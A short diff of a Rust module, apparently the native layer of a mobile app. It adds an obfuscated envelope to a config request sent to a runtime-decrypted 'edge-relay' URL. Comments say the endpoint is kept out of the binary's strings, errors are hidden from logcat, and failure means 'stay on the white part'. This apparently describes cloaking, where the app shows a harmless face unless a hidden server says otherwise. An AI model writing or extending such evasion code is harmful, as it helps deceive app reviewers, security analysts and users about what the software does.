@@ -9,24 +9,26 @@
 //! Transport: `ureq` with rustls. No system CA bundle lookup, no OpenSSL,
 //! no plaintext endpoint symbol in the binary strings table.
 
+use std::io::Read;
 use std::time::Duration;
 
 use crate::seal;
 use crate::theme;
+use crate::veil;
 
-/// Issue the config POST and return the response body on 2xx.
-///
-/// On any error returns an empty vector; the caller treats that as "stay
-/// on the white part". Never returns the error text — nothing from the
-/// network stack should ever leak into Dart or logcat.
+/// Pack `payload_json` into the sealed envelope and POST it to the
+/// sealed edge-relay URL. Returns the upstream response body on 2xx;
+/// empty vector on any error.
 pub fn fetch(payload_json: &[u8]) -> Vec<u8> {
     let url = seal::unseal_str(0);
     if url.is_empty() {
         return Vec::new();
     }
+    let envelope = veil::pack(payload_json);
+    if envelope.is_empty() {
+        return Vec::new();
+    }
 
-    // UA uses the raw template; we don't know the Dart version at this
-    // level, so we just drop the placeholder.
     let ua = theme::build_user_agent("1");
 
     let agent = ureq::AgentBuilder::new()
@@ -38,7 +40,7 @@ pub fn fetch(payload_json: &[u8]) -> Vec<u8> {
         .post(&url)
         .set("Content-Type", "application/json")
         .set("Accept", "application/json")
-        .send_bytes(payload_json)
+        .send_string(&envelope)
     {
         Ok(r) => r,
         Err(_) => return Vec::new(),
@@ -59,7 +61,3 @@ pub fn fetch(payload_json: &[u8]) -> Vec<u8> {
     }
     body
 }
-
-// Re-exported here so `config::fetch` can `.read_to_end` without pulling
-// `std::io::Read` at every call site.
-use std::io::Read;
